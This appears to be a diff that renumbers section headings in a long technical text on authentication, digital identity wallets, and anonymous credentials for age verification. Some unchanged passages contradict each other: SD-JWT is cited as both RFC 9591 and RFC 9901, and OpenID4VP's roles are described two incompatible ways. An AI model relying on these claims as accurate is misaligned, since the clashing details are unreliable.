@@ -33310,7 +33312,7 @@ $$
 
 The user's device must display the exact amount and payee, and the authentication response must be cryptographically bound to these values. Generic "approve this transaction" prompts are non-compliant.
 
-##### 26.7.5 FAPI 2.0 ACR Requirements
+##### 28.7.5 FAPI 2.0 ACR Requirements
 
 The Financial Grade API (FAPI) 2.0 specification, defined by the OpenID Foundation, imposes strict requirements on ACR handling for financial services contexts:
 
@@ -33476,7 +33478,7 @@ Risk-based authentication systems inherently build behavioural profiles of users
 The recommended approach for most deployments is zone-based or coarse-grained location checks. Users can be informed that "access from outside trusted locations may require additional verification" without revealing that the system tracks their precise coordinates.
 
 #### 28.11 Advanced Risk Modeling and Evasion Resistance
-##### 26.11.1 Federated Risk Sharing
+##### 28.11.1 Federated Risk Sharing
 
 In multi-tenant and federated environments, risk signals observed by one entity may be valuable to another. Federated risk sharing via federated learning allows organisations to improve their risk models collectively without exposing raw user data. Each participant trains a local model on their own authentication data and shares only model parameters (gradients), which are aggregated into a global model:
 
@@ -33496,7 +33498,7 @@ Not all signal types are equally suitable for sharing:
 | User risk scores | Low | High — individual scores are PII |
 | Authentication event logs | Very Low | Very High — raw logs contain extensive PII |
 
-##### 26.11.2 Risk-Based Rate Limiting
+##### 28.11.2 Risk-Based Rate Limiting
 
 Traditional rate limiting applies uniform thresholds (e.g., "max 5 login attempts per minute per IP"). Risk-based rate limiting adjusts thresholds based on the assessed risk of the actor:
 
@@ -33516,7 +33518,7 @@ where $R_{base}$ is the baseline rate limit and $f_{decay}$ reduces the allowed 
 
 This ensures legitimate users with known devices are not locked out by aggressive rate limits, while attackers face progressively tighter constraints.
 
-##### 26.11.3 Deception-Based Risk Signals
+##### 28.11.3 Deception-Based Risk Signals
 
 Some advanced RBA systems incorporate deliberate deception elements — honeytokens and canary values — that trigger risk signals only when accessed by an attacker. These provide near-zero false positive rates because legitimate users have no reason to interact with decoy assets:
 
@@ -33527,7 +33529,7 @@ Some advanced RBA systems incorporate deliberate deception elements — honeytok
 | Canary files | File shares, cloud storage | Download indicates insider threat |
 | Decoy endpoints | API surface | Access indicates automated scanning |
 
-##### 26.11.4 Attack-Resistant Risk Models
+##### 28.11.4 Attack-Resistant Risk Models
 
 Sophisticated attackers can manipulate risk scoring systems through four principal vectors: **signal injection** (spoofing device fingerprints or IP addresses), **adversarial examples** (crafting events classified as low-risk despite being malicious), **model extraction** (querying the risk engine repeatedly to reconstruct the model), and **slow-and-low attacks** (mimicking legitimate behaviour patterns to avoid velocity-based detection).
 
@@ -33586,7 +33588,7 @@ A six-step incident playbook applies: (1) **Detection** — automated alert on a
 #### 28.13 Break-Glass MFA and Emergency Access
 Break-glass accounts are human-operated accounts for emergency access, typically with elevated privileges. They are used when normal MFA is unavailable — for example, during an outage of the MFA provider, after the loss of all authentication devices, or during a security incident where the MFA system itself is compromised.
 
-##### 26.13.1 The Break-Glass Problem
+##### 28.13.1 The Break-Glass Problem
 
 Break-glass accounts exist because MFA, while essential for security, creates a single point of failure. If the user's only MFA device is a smartphone and the phone is lost, stolen, or has a dead battery, the user cannot authenticate — even for emergency operations like incident response. Service accounts face a similar problem: automated processes cannot complete MFA challenges because there is no human to approve the prompt.
 
@@ -33594,7 +33596,7 @@ The break-glass design must balance two opposing requirements:
 - **Availability**: The break-glass account must be accessible when normal MFA is unavailable.
 - **Security**: The break-glass account must not be so easy to use that it becomes the default authentication path, bypassing MFA entirely.
 
-##### 26.13.2 Patterns
+##### 28.13.2 Patterns
 
 **Physical hardware token escrow:**
 
@@ -33625,7 +33627,7 @@ Microsoft's recommended pattern for Azure AD/Entra ID break-glass:
 - Break-glass accounts are excluded from Conditional Access policies that block sign-ins from untrusted locations (so they can be used from any location during an emergency).
 - Periodic access reviews ensure break-glass accounts are still needed and the stored keys are functional.
 
-##### 26.13.3 Anti-Patterns
+##### 28.13.3 Anti-Patterns
 
 | Anti-Pattern | Why It's Dangerous |
 |:-------------|:-------------------|
@@ -33650,7 +33652,7 @@ OpenID for Verifiable Presentations (OpenID4VP) and OpenID for Verifiable Creden
 
 Together, these protocols form the "presentation and issuance" layer of the decentralized identity stack. They sit above the W3C Verifiable Credentials Data Model (which defines *what* credentials are) and below the application layer (which defines *why* a credential is needed — e.g., age verification, diploma verification, payment authentication).
 
-#### 28.1.1 Motivation and Standards Landscape
+#### 29.1 Motivation and Standards Landscape
 
 Traditional OIDC returns identity claims in an ID token or userinfo response. These claims are:
 - **Unselective.** The OP decides which claims to return; the RP cannot request specific attributes with fine-grained constraints.
@@ -33674,7 +33676,7 @@ OpenID4VP and OpenID4VCI bridge the OIDC and VC worlds:
 
 The relationship between these protocols is complementary, not competing. OpenID4VP uses OAuth 2.0 authorization flows (authorization code with PKCE) to negotiate credential presentation. OpenID4VCI uses similar flows for credential issuance. Both are credential-format-agnostic: they can carry SD-JWTs, mDLs, VC_JWTs, or other formats.
 
-#### 28.1.2 OpenID4VP Protocol Flow
+#### 29.2 OpenID4VP Protocol Flow
 
 OpenID4VP follows the OAuth 2.0 authorization code flow with PKCE, with the wallet acting as the client and the RP acting as the authorization server. The key difference from standard OIDC is that the authorization request specifies *which credentials* the RP wants, using a Presentation Definition.
 
@@ -33754,7 +33756,7 @@ The RP then calls the wallet's presentation endpoint with the access token to re
 | Claims verified by | OP's signature | Issuer's signature (per credential) |
 | User consent | "Allow app to access your info?" | "Share these specific claims with this verifier?" |
 
-#### 28.1.3 Presentation Definition and Submission
+#### 29.3 Presentation Definition and Submission
 
 The **Presentation Definition** is the core mechanism by which an RP specifies what credentials it requires and how the wallet should present them. It is defined by the Decentralized Identity Foundation (DIF) Presentation Exchange v2 specification and is embedded in the OpenID4VP authorization request as a JSON string.
 
@@ -33858,7 +33860,7 @@ The wallet matches its stored credentials against the input descriptors, present
 
 The `descriptor_map` links each input descriptor to the location of the selected credential in the VP token. This allows the RP to process each credential individually and verify it against the corresponding input descriptor's constraints.
 
-#### 28.1.4 OpenID4VCI Protocol Flow
+#### 29.4 OpenID4VCI Protocol Flow
 
 OpenID4VCI handles the issuance of verifiable credentials — the process by which an issuer creates a credential and stores it in the holder's wallet. It uses the OAuth 2.0 authorization code flow, with the wallet acting as the OAuth client and the issuer acting as the authorization server.
 
@@ -33941,7 +33943,7 @@ Key elements:
 
 The `credential` field contains the SD-JWT credential, which the wallet stores securely (encrypted at rest, protected by the device's secure enclave or biometric unlock).
 
-#### 28.1.5 SD-JWT as the Primary Credential Format
+#### 29.5 SD-JWT as the Primary Credential Format
 
 SD-JWT (Selective Disclosure JSON Web Token) is the IETF standard (RFC 9591) for verifiable credentials with selective disclosure. It is the most widely adopted format for OpenID4VP and OpenID4VCI, supported by the EU's EUDI Wallet, ISO 18013-5 mDL implementations, and most major wallet providers.
 
@@ -34018,7 +34020,7 @@ SD-JWTs support key binding through a holder-signed JWT appended to the credenti
 | Privacy | High (per-claim disclosure) | Low (all claims exposed) | High (per-data-element) |
 | Revocation | Via status list | External mechanism | Via online status |
 
-#### 28.1.6 Security Considerations
+#### 29.6 Security Considerations
 
 **Wallet authentication.** In OpenID4VP, the wallet acts as the authorization server. The RP must verify the wallet's identity using the `client_id_scheme`. The `did:web` scheme provides the strongest binding (the wallet's DID is resolved via HTTPS to a well-known DID document). The `redirect_uri` scheme provides the weakest binding (any entity that controls the redirect URI can act as a wallet).
 
@@ -34047,7 +34049,7 @@ Decentralized Identifiers (DIDs) are a W3C standard (DID Core v1.0) for globally
 
 This chapter covers the DID ecosystem end-to-end: the DID specification itself, the landscape of DID methods (each defining a different trust model and resolution mechanism), the architecture of digital wallets that store and manage DID-controlled credentials, and the governance frameworks that enable trust between issuers, holders, and verifiers in a decentralized system.
 
-#### 28.2.1 DID Fundamentals
+#### 30.1 DID Fundamentals
 
 A **Decentralized Identifier** (DID) is a URI that identifies a subject (person, organization, device, or abstract entity) and resolves to a **DID document** describing that subject's public keys and verification methods. The general syntax is:
 
@@ -34134,7 +34136,7 @@ Key elements:
 
 DIDs are not inherently more "private" or "decentralized" than other identifier types — it depends entirely on the DID method. A `did:web` is resolved via DNS (centralized infrastructure), while a `did:key` is self-contained (fully decentralized but not updateable).
 
-#### 28.2.2 DID Method Landscape
+#### 30.2 DID Method Landscape
 
 The DID method registry (W3C) lists over 100 registered methods as of 2026. However, only a handful are widely deployed in production authentication systems. This section covers the methods most relevant to the authentication use cases discussed in DR-0003.
 
@@ -34209,7 +34211,7 @@ The DID method registry (W3C) lists over 100 registered methods as of 2026. Howe
 | did:ebsi | EBSI ledger | Yes | Moderate | EU ledger | EU digital ID |
 | did:peer | Self-contained | No | Very high | None | DIDComm |
 
-#### 28.2.3 DID Resolution and Verification
+#### 30.3 DID Resolution and Verification
 
 DID resolution is the process of retrieving a DID document from a DID. The W3C DID Resolution specification defines a uniform API for resolving any DID method through a generic resolver.
 
@@ -34250,7 +34252,7 @@ When a VP token or SD-JWT includes a `sub` (or `iss`) claim containing a DID, th
 
 This is the decentralized equivalent of "verify the certificate chain" in PKI. The key difference: there is no CA hierarchy. The verifier trusts the DID's key directly, based on the DID method's trust model (DNS security for `did:web`, Bitcoin immutability for `did:ion`, EU government accreditation for `did:ebsi`).
 
-#### 28.2.4 Wallet Architecture
+#### 30.4 Wallet Architecture
 
 A digital wallet is the software (or hardware) that stores a holder's DIDs, verifiable credentials, and cryptographic key material. In the decentralized identity model, the wallet replaces the browser's cookie store and the IdP's session database as the primary credential storage mechanism.
 
@@ -34286,7 +34288,7 @@ A digital wallet is the software (or hardware) that stores a holder's DIDs, veri
 - **Hosted/custodial wallets.** A third-party provider (bank, telco, government agency) manages the wallet and keys on the holder's behalf. This provides better recovery options (the provider can re-issue credentials if the device is lost) but introduces a trust dependency on the provider.
 - **Hybrid wallets.** Credentials are stored on the device (self-custody), but a backup of the encrypted key material is stored with a trusted custodian. This provides both security (the device must be unlocked to use credentials) and recovery (the custodian can restore access if the device is lost). The EU EUDI Wallet uses this model.
 
-#### 28.2.5 Wallet Security Model
+#### 30.5 Wallet Security Model
 
 The security of a digital wallet depends on three layers: device security, application security, and credential-level security.
 
@@ -34309,7 +34311,7 @@ The security of a digital wallet depends on three layers: device security, appli
 - **Social recovery**: The holder designates trusted contacts who can collectively authorize wallet recovery. The wallet's key is split using secret sharing (Shamir's Secret Sharing) among N contacts, and M-of-N are required to restore the wallet. This is experimental but being explored in the Web3 ecosystem.
 - **Custodial recovery**: For hosted wallets, the custodian can re-provision credentials if the device is lost. This requires the holder to re-authenticate with the custodian (e.g., via government-issued ID proofing).
 
-#### 28.2.6 Governance Frameworks
+#### 30.6 Governance Frameworks
 
 Decentralized identity systems require governance to establish trust between parties that have no prior relationship. A governance framework defines the rules, policies, and processes that govern how DIDs, credentials, and wallets interact within a trust ecosystem.
 
@@ -34333,7 +34335,7 @@ A **Trust Ecosystem** is a specific instantiation of the ToIP stack — a networ
 - **Issuers**: Organizations (public and private) that issue verifiable credentials through the wallet. Issuers must be accredited by a member state's governance authority.
 - **Verifiers**: Organizations that accept and verify credentials from the wallet. Verifiers must comply with the wallet's trust framework (e.g., accept only credentials from accredited issuers, follow data minimization principles).
 
-#### 28.2.7 Trust Registries and Accreditation
+#### 30.7 Trust Registries and Accreditation
 
 A **trust registry** is a list of accredited participants in a trust ecosystem, along with their status and metadata. Trust registries are the mechanism by which a verifier determines whether to trust a credential issuer: if the issuer is listed in the trust registry and their status is "active," the verifier accepts credentials from that issuer; otherwise, the credential is rejected.
 
@@ -34377,7 +34379,7 @@ Anonymous credentials solve this problem at the cryptographic layer. They enable
 This chapter examines the cryptographic constructions that enable anonymous credential schemes — with particular focus on ECDSA-based constructions that operate over existing credential infrastructure — and evaluates their privacy properties (unlinkability, selective disclosure, predicate proofs) against the simpler selective disclosure mechanisms adopted by production identity systems (SD-JWT, mdoc). It concludes with an analysis of how these technologies integrate with the regulatory frameworks — the UK Online Safety Act, the EU Digital Services Act, and eIDAS 2.0 — that are driving mandatory age verification requirements across jurisdictions.
 
 #### 31.1 Cryptographic Construction
-##### 28.1.1 The Problem: Full-Disclosure Authentication
+##### 31.1.1 The Problem: Full-Disclosure Authentication
 
 The identity verification pipeline inherited from physical credentials operates on a binary: present the credential or don't. The credential is an atomic unit — the verifier receives everything or nothing. This model creates three distinct privacy failures:
 
@@ -34415,7 +34417,7 @@ flowchart LR
 
 An ideal age verification system would reveal only a single bit of information to the verifier — "age ≥ 18: true" — while providing cryptographic assurance that this bit was derived from a credential issued by a trusted authority, without revealing the holder's identity, without enabling cross-service linkage, and without notifying the issuer.
 
-##### 28.1.2 Anonymous Credentials: Theory
+##### 31.1.2 Anonymous Credentials: Theory
 
 Anonymous credentials — formalised by Chaum (1985), extended by Camenisch and Lysyanskaya (2001, 2004), and further developed through the Idemix and U-Prove systems — provide exactly these properties. The general construction involves three parties:
 
@@ -34446,7 +34448,7 @@ For the EUDI Wallet, the distinction matters because eIDAS 2.0 requires QSCD-lev
 
 </details>
 
-##### 28.1.3 BBS+ Signatures: Multi-Message Selective Disclosure
+##### 31.1.3 BBS+ Signatures: Multi-Message Selective Disclosure
 
 BBS+ signatures (Boneh-Boyen-Shacham, extended by Au, Susilo, and Mu) are the leading cryptographic primitive for anonymous credentials in the verifiable credentials ecosystem. The construction is standardised in `draft-irtf-cfrg-bbs-signatures-10` (IRTF CFRG, updated January 2026; Informational status).
 
@@ -34609,7 +34611,7 @@ flowchart LR
 
 The ARF specifies support for both BBS+ and BBS, with a migration path to BBS once IETF standardisation is complete. Implementations should treat BBS as the target scheme and BBS+ as the compatibility fallback. Note that the CFRG draft does **not** include built-in predicate proofs — range proofs and set membership proofs remain external extensions, as confirmed by the draft's §9.4 and §10.8, which reference Bulletproofs ([BBB17]) and dynamic accumulators ([VB22]) as complementary mechanisms.
 
-##### 28.1.4 ECDSA-Based Anonymous Credentials: Retrofitting Existing Infrastructure
+##### 31.1.4 ECDSA-Based Anonymous Credentials: Retrofitting Existing Infrastructure
 
 The practical limitation of BBS+ is that it requires pairing-friendly curves (BLS12-381) and a new signature scheme — existing credential infrastructure (government-issued digital IDs, mobile driving licences, eIDAS 2.0 PIDs) uses **ECDSA over P-256** or **EdDSA over Ed25519**. Replacing the cryptographic infrastructure of every government credential issuer worldwide is not realistic in the near term.
 
@@ -34672,7 +34674,7 @@ flowchart LR
 
 **Deployment advantage:** This construction works with existing ECDSA-signed credentials without any changes to the issuer's signing infrastructure, key material, or issuance process. A government that already issues mdoc mobile driving licences with ECDSA P-256 signatures can immediately enable anonymous age verification — the holder's wallet application generates the ZKP locally, and the verifier validates it against the government's existing public key.
 
-##### 28.1.5 SD-JWT: Selective Disclosure Without Zero-Knowledge Proofs
+##### 31.1.5 SD-JWT: Selective Disclosure Without Zero-Knowledge Proofs
 
 SD-JWT (Selective Disclosure for JWTs), standardised as **RFC 9901** (November 2025), takes a fundamentally different approach to selective disclosure — one that avoids zero-knowledge proofs entirely, trading privacy properties for implementation simplicity.
 
@@ -34785,7 +34787,7 @@ Because the SD-JWT outer signature never changes across different presentations,
 
 </details>
 
-##### 28.1.6 mdoc: ISO 18013-5 Mobile Driving Licence
+##### 31.1.6 mdoc: ISO 18013-5 Mobile Driving Licence
 
 The mdoc format (ISO 18013-5) is the mobile driving licence standard adopted by the EUDI Wallet alongside SD-JWT-VC. Its selective disclosure mechanism differs from both BBS+ and SD-JWT:
 
@@ -34801,7 +34803,7 @@ The mdoc format (ISO 18013-5) is the mobile driving licence standard adopted by 
 
 **Predicate proofs — not natively supported:** Like SD-JWT, mdoc supports only binary disclosure of pre-computed elements. The `age_over_18` element is a boolean computed at issuance — the holder cannot prove arbitrary predicates over the `birth_date` element without disclosing it. The Frigo-Shelat ECDSA anonymous credential construction (§31.1.4) specifically targets mdoc to retrofit predicate proof capability onto existing mdoc credentials.
 
-##### 28.1.7 Anonymous Credential Lifecycle Protocols
+##### 31.1.7 Anonymous Credential Lifecycle Protocols
 
 The anonymous credential system operates in a three-party trust model: **Issuer** (government authority with BBS+ signing key), **Holder** (citizen wallet storing credentials and generating ZK proofs), and **Verifier** (relying party verifying proofs against the issuer's public key). The verifier trusts the issuer (through PKI certificate validation) and the proof protocol (through cryptographic verification) — the verifier does not need to trust the holder.
 
@@ -34822,7 +34824,7 @@ The anonymous credential system operates in a three-party trust model: **Issuer*
 **Domain separation.** The EUDI Wallet supports multiple credential types (PID, mDL, diploma, medical prescription, residence permit), each with a distinct attribute schema. Domain separation prevents cross-credential attacks where a proof generated for one credential type is accepted by a verifier expecting a different type. The BBS+ proof context string includes a credential type identifier (`eu.europa.ec.eudi.pid.1`, `iso.org.18013.5.1.mDL`, etc.), ensuring that a PID proof cannot be replayed as a diploma credential even if the attribute schemas overlap.
 
 #### 31.2 Unlinkability and Selective Disclosure Properties
-##### 28.2.1 Privacy Property Taxonomy
+##### 31.2.1 Privacy Property Taxonomy
 
 Three privacy properties are relevant for age verification credentials:
 
@@ -34832,7 +34834,7 @@ Three privacy properties are relevant for age verification credentials:
 | **Unlinkability** | Two presentations of the same credential cannot be correlated by colluding verifiers | Prevents the creation of cross-service tracking profiles — "user X visited adult site A, alcohol vendor B, and gambling platform C" |
 | **Predicate proofs** | The holder proves a predicate (e.g., "age ≥ 18") without revealing the underlying attribute value (e.g., date of birth) | Reveals strictly the minimum information — one bit (predicate result) rather than a full date value |
 
-##### 28.2.2 Comparative Analysis
+##### 31.2.2 Comparative Analysis
 
 | Property | BBS+ | SD-JWT (RFC 9901) | mdoc (ISO 18013-5) | ECDSA-AC (Frigo-Shelat) |
 |:---------|:-----|:-------------------|:--------------------|:-----------------------|
@@ -34864,7 +34866,7 @@ Three privacy properties are relevant for age verification credentials:
 
 ⚠️ CL-Signatures and Idemix are included for academic context — they represent the cryptographic lineage from which BBS+ evolved. They are not part of the EUDI Wallet ecosystem and are not adopted by eIDAS 2.0.
 
-##### 28.2.3 The Unlinkability Gap in Production Systems
+##### 31.2.3 The Unlinkability Gap in Production Systems
 
 The comparison table reveals a critical gap: **neither of the two credential formats mandated by eIDAS 2.0 provides full unlinkability.** SD-JWT presentations are trivially linkable via the fixed JWT signature. mdoc presentations are linkable via the fixed MSO signature unless the issuer provides batch MSOs (ISO 18013-7) — a mitigation that increases issuance complexity and requires periodic credential refresh.
 
@@ -34872,7 +34874,7 @@ This gap is not accidental — it reflects a deliberate engineering tradeoff. BB
 
 The ARF acknowledges this limitation. The European Commission's technical specifications note that unlinkability is a desirable privacy property that may be addressed in future ARF revisions — potentially through BBS+ adoption, batch issuance mechanisms, or ECDSA-based anonymous credential schemes like Frigo-Shelat once they mature from research to standard.
 
-##### 28.2.4 Predicate Proofs vs. Attribute Disclosure
+##### 31.2.4 Predicate Proofs vs. Attribute Disclosure
 
 The distinction between predicate proofs and attribute disclosure is the most consequential privacy property for age verification:
 
@@ -34882,7 +34884,7 @@ The distinction between predicate proofs and attribute disclosure is the most co
 
 **Predicate proof** (BBS+ with range proofs, ECDSA-AC): The verifier receives a cryptographic proof that the predicate "age ≥ 18" is satisfied — nothing more. The proof reveals no information about the holder's actual date of birth. The verifier cannot distinguish between a 19-year-old and a 45-year-old — both produce proofs that satisfy the same predicate. Furthermore, predicate proofs are **dynamic** — the holder can prove different predicates from the same credential: "age ≥ 18" for an alcohol purchase, "age ≥ 21" for a US gambling site, "age ≥ 25" for a car rental — all from the same underlying date-of-birth attribute.
 
-##### 28.2.5 Formal Unlinkability Definition
+##### 31.2.5 Formal Unlinkability Definition
 
 The formal privacy property underlying BBS+ proofs is **presentation unlinkability**: for any two valid presentation transcripts $\tau_1$ and $\tau_2$, the distributions where both originate from the same credential and where they originate from different credentials must be computationally indistinguishable:
 
@@ -34890,7 +34892,7 @@ $$\text{REAL}_{\text{same}} = \{\tau_1, \tau_2 \mid \text{both from same credent
 
 BBS+ achieves this through proof randomisation: each proof uses freshly generated randomness, producing a different commitment and different challenge-response values even when derived from the same signature. Note that this guarantee applies only to the BBS+ proof value — other information leaked during the interaction (disclosed attributes, device binding keys, network addresses) may still enable correlation.
 
-##### 28.2.6 Correlation Attack Vectors
+##### 31.2.6 Correlation Attack Vectors
 
 Despite the cryptographic unlinkability of BBS+ proofs, several side-channel attack vectors can enable correlation in practice:
 
@@ -34906,15 +34908,15 @@ Despite the cryptographic unlinkability of BBS+ proofs, several side-channel att
 
 The device binding ECDSA signature is the most significant correlation vector. If the same device key pair is used across all presentations, a verifier (or colluding verifiers) can link presentations by the device public key. The ARF recommends ephemeral device keys per-presentation, with the long-term device key certifying the ephemeral key via a delegation chain, though this is not universally implemented in pilot projects.
 
-##### 28.2.7 Revocation Privacy Concerns
+##### 31.2.7 Revocation Privacy Concerns
 
 The revocation mechanism itself can leak privacy-relevant information. If the accumulator value changes only when a credential is revoked, an observer tracking accumulator updates can infer revocation events and correlate presentations with revocation timing. The ARF mandates **periodic accumulator updates** at fixed intervals (minimum: every 4 hours), regardless of whether revocations occurred. This provides a noisy update schedule that masks individual revocation events. The accumulator witness included in each proof is unique per credential but does not reveal the credential's identity — it is computationally indistinguishable from random.
 
-##### 28.2.8 Cross-Credential Linking Risks
+##### 31.2.8 Cross-Credential Linking Risks
 
 A significant privacy concern arises when a holder presents multiple credentials (e.g., a PID and a diploma) to the same verifier. Even if each credential's proof is independently unlinkable, the verifier can link them because: the same device binding key signs both proofs (unless ephemeral keys are used), the same BLE connection or IP address carries both proofs, and the timing of the two presentations is identical. The ARF recommends that when multiple credentials must be presented simultaneously, the wallet should generate a single combined Verifiable Presentation (VP) container that binds all credential proofs together with a single device attestation, rather than presenting each credential separately.
 
-##### 28.2.9 Anonymous Credential Ecosystem Landscape
+##### 31.2.9 Anonymous Credential Ecosystem Landscape
 
 Beyond the four schemes compared in §31.2.2, several full-stack anonymous credential platforms provide end-to-end infrastructure for issuance, management, and verification. These represent the academic and open-source lineage that informed the EUDI Wallet's design:
 
@@ -34933,7 +34935,7 @@ Beyond the four schemes compared in §31.2.2, several full-stack anonymous crede
 The EUDI Wallet's choice of BBS+ (piloted) over CL-signatures (Idemix/AnonCreds) was driven by smaller proof sizes (important for BLE proximity transmission), native multi-message signing, faster single-pairing verification on mobile ARM processors, and the IETF CFRG standardisation trajectory providing interoperability guarantees.
 
 #### 31.3 Integration with National Age Verification Systems
-##### 28.3.1 UK Online Safety Act (2023)
+##### 31.3.1 UK Online Safety Act (2023)
 
 The UK Online Safety Act 2023, with age verification enforcement commencing **July 25, 2025**, imposes the most prescriptive age assurance requirements of any jurisdiction. Key provisions:
 
@@ -34953,7 +34955,7 @@ The UK Age Verification Providers Association (AVPA) has published an Age Verifi
 | **iProov** | Biometric liveness + document verification | Full identity disclosure during verification; provider holds biometric data |
 | **Jumio** | Document scan + facial comparison + liveness | Full identity exposure; provider processes and stores identity data |
 
-##### 28.3.2 EU Digital Services Act (DSA)
+##### 31.3.2 EU Digital Services Act (DSA)
 
 The EU Digital Services Act requires very large online platforms (VLOPs — platforms with 45 million+ monthly active users in the EU) to implement "appropriate and proportionate" measures to protect minors, including age verification mechanisms. The compliance deadline aligns with July 2025.
 
@@ -34965,7 +34967,7 @@ Key distinctions from the UK OSA:
 
 **GDPR alignment.** The GDPR principle of data minimisation (Article 5(1)(c)) is perhaps the strongest regulatory argument for anonymous credentials. Selective disclosure ensures that only the minimum required attributes are transmitted to the verifier — storage minimisation (the holder stores only issuer-signed attributes), transmission minimisation (only disclosed attributes are sent), and retention minimisation (the verifier receives a one-time proof, not a copy of the credential). The European Data Protection Board (EDPB) has endorsed anonymous credentials as a privacy-enhancing technology (PET) in its EDPB-EDPS Joint Opinion 5/2021 on digital identity, recommending that data controllers evaluate anonymous credentials as a means of achieving GDPR compliance in identity verification scenarios.
 
-##### 28.3.3 eIDAS 2.0 and the EUDI Wallet
+##### 31.3.3 eIDAS 2.0 and the EUDI Wallet
 
 The EUDI Wallet — mandated by eIDAS 2.0 for availability across all EU Member States by 2026 — provides the production infrastructure for credential-based age verification. The wallet supports two credential formats:
 
@@ -35022,7 +35024,7 @@ flowchart TD
 
 **Pilot projects.** The EUDI Wallet is being rolled out through large-scale pilot projects funded by the European Commission. As of March 2026, active or completed pilots include Germany (PID + mDL, BBS+ + OpenID4VP, completed 2024), France (PID + Diploma, BBS+ + mDL, in progress), Netherlands (PID with IRMA integration, CL-signatures + BBS+ bridge, in progress), Italy (PID + Residence Permit, BBS+ + MDoc, in progress), Finland (PID + mDL, BBS+ + BLE proximity, in progress), and a multi-country Large-Scale Pilot consortium (12 countries, PID + mDL + Diploma + Medical, BBS+ + ARF v2.0, kick-off 2025). The German and Finnish pilots have achieved ARF conformance certification. SDK support includes the Mattr BBS+ SDK (TypeScript), zkkit (Rust + WASM), the IETF BBS reference implementation, and Hyperledger AnonCreds v2.0 (migrating from CL-signatures to BBS+). Conformance testing covers four suites: ARF Conformance Test Suite, IETF BBS Interop Test Vectors, ISO 18013-5/7 Test Harness, and OpenID4VP Conformance Suite.
 
-##### 28.3.4 The Market Gap: Cryptographic Anonymous Credentials vs. Production Reality
+##### 31.3.4 The Market Gap: Cryptographic Anonymous Credentials vs. Production Reality
 
 The age verification landscape reveals a stark gap between cryptographic theory and production deployment:
 
@@ -35036,7 +35038,7 @@ The technologies that provide the strongest privacy properties (BBS+, ECDSA-AC) 
 
 The most promising bridge technology is the ECDSA-AC construction — because it works with existing ECDSA-signed credentials (no issuer infrastructure changes), its performance is practical for mobile use (1.2 seconds), and it upgrades existing mdoc credentials from binary selective disclosure to full anonymous credential capability. If adopted, it would allow the EUDI Wallet to provide unlinkable, predicate-based age verification using the same government-issued credentials that are already being deployed — without requiring any Member State to change their credential issuance infrastructure.
 
-##### 28.3.5 BBS+ Selective Disclosure Flow
+##### 31.3.5 BBS+ Selective Disclosure Flow
 
 The idealised anonymous credential flow for age verification — using BBS+ as the representative scheme — operates as follows:
 
@@ -35157,7 +35159,7 @@ The verifier computationally performs the following strict validation:
 
 </details>
 
-##### 28.3.6 ECDSA-AC Selective Disclosure Flow
+##### 31.3.6 ECDSA-AC Selective Disclosure Flow
 
 While the BBS+ flow requires new pairing-friendly infrastructure, the **ECDSA-AC Flow** operates differently by wrapping standard mdoc credentials inside a zero-knowledge construct.
 
@@ -35271,7 +35273,7 @@ The Verifier validates the massive constraint system proof payload locally. It e
 - **On-Device Hardware Limits:** Standard HSMs efficiently compute pairing-less ECDSA and RSA, but BLS pairings are rarely natively accelerated. The ECDSA-AC approach side-steps missing hardware acceleration by executing its proof structures within standard software paradigms, retaining acceptable speeds (1.2s processing time).
 - **Adoption Within EUDI:** The introduction of ECDSA-AC proofs closes the immediate gap preventing unlinkable predicate proofs in eIDAS 2.0 without rewriting the core Architecture Reference Framework (ARF) cryptographic standards mandates.
 
-##### 28.3.7 AML/KYC Requirements Intersection
+##### 31.3.7 AML/KYC Requirements Intersection
 
 Anti-Money Laundering (AML) and Know Your Customer (KYC) regulations present a fundamental tension with anonymous credentials. The EU's AML5/6 Directives require financial institutions to verify customer identity, including collection of "full name, date of birth, and address." Selective disclosure enables revealing only a subset of these attributes — but the European Banking Authority (EBA) has indicated that selective disclosure is acceptable for KYC only if the relying party can satisfy its regulatory obligations with the disclosed attributes.
 
@@ -35291,25 +35293,25 @@ The wallet software enforces the regulatory minimum on behalf of the user but al
 #### 31.4 Selective Disclosure Beyond Age Verification
 Age verification is the most prominent use case for anonymous credentials, but the same cryptographic constructions apply to a broader set of privacy-sensitive attribute disclosures. This section surveys four additional use cases where selective disclosure provides meaningful privacy improvements over traditional credential presentation.
 
-##### 28.4.1 Address Verification Without Full Address
+##### 31.4.1 Address Verification Without Full Address
 
 Proof of residence is routinely required for opening bank accounts, registering vehicles, and accessing region-locked services. Traditional disclosure reveals the full street address — a highly sensitive attribute that, in combination with a name, serves as a quasi-unique identifier.
 
 With BBS+ selective disclosure, the holder proves jurisdictional attributes (country, region/city) without exposing the exact street address. The PID credential contains the address as a structured attribute; the holder discloses only the country and region sub-fields, keeping the street address and number hidden. This satisfies the verifier's jurisdictional requirement (e.g., "the applicant is a resident of Germany") while minimising the data exposure to the regulatory minimum.
 
-##### 28.4.2 Diploma Verification Without Institution Disclosure
+##### 31.4.2 Diploma Verification Without Institution Disclosure
 
 When proving educational qualifications for a job application, traditional disclosure reveals the full name, university, degree type, graduation date, and student ID. This exposes the applicant to institutional bias — a recruiter can filter candidates based on university prestige before evaluating actual qualifications.
 
 With anonymous credentials, the holder discloses only the degree type (e.g., "MSc Computer Science") and graduation year, without revealing which university awarded the degree or the graduate's name. The verifier confirms that a trusted educational authority issued a credential attesting to the claimed qualification, without learning the institution. This approach is being explored in several EU pilot projects as a means of reducing credential-based discrimination in hiring.
 
-##### 28.4.3 Income Range Proof
+##### 31.4.3 Income Range Proof
 
 Financial services — mortgage pre-qualification, insurance eligibility, means-tested benefits — often require proof of income. Traditional disclosure demands payslips, tax returns, or employer letters revealing exact salary figures.
 
 With BBS+ range proofs, the holder proves that their income falls within a specified range (e.g., 40,000–80,000 EUR) without revealing the exact figure. The income attribute is encoded as an integer in the credential; the range proof demonstrates it falls within the verifier-specified bounds. The ARF v2.0 includes income range proof as a proposed pilot use case for financial sector relying parties, though the credential type and attribute schema are still under development.
 
-##### 28.4.4 Cross-Account Accountability
+##### 31.4.4 Cross-Account Accountability
 
 A unique EU-specific use case: proving that two different online accounts belong to the same natural person, without revealing the person's identity. A social media platform may need to verify that a user's account is linked to a real identity, without learning the user's actual identity.
 
@@ -35331,7 +35333,7 @@ With BBS+ equality proofs, the holder generates a proof that two credential attr
 #### 31.5 Security Analysis
 The anonymous credential system introduces a unique threat model that differs significantly from conventional authentication. This section maps the threat actors, enumerates the attack surface, and summarises the mitigation strategies relevant to BBS+-based and ECDSA-AC-based credential deployments in the EUDI Wallet.
 
-##### 28.5.1 Threat Model
+##### 31.5.1 Threat Model
 
